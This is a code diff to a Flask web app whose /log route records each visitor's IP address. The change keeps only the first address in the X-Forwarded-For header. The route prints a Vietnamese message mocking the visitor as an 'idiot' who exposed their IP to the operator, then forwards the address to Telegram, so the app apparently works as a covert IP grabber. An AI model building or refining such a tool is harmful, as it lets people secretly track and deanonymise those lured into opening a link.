@@ -27,7 +27,9 @@ def home():
 
 @app.route("/log", methods=["GET"])
 def log_ip():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)    
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()  # lấy IP đầu tiên
     print("Thêm 1 Thằng Ngu Vừa Lộ Địa Chỉ IP Thưa Đại Ca Quân ĐZ. IP: ", ip)
     send_to_telegram(ip)
     return {"ip": ip}
